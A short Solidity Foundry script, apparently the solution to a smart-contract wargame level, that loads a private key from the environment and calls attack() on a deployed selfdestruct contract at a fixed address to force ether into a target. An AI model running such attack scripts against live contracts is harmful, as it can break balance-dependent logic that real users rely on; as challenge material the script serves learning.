//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/SelfdestructContract.sol";

/**
 * Also see TransferFundsToSelfdestruct.s.sol & SelfdesctructContract.sol
 */

contract ForceAttacker is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        Selfdestruct selfdestructContract = Selfdestruct(
            payable(address(0xB4c00161D0744fAA12bd5aaDee59D9493e0CFE3b))
        );
        selfdestructContract.attack();
        vm.stopBroadcast();
    }
}
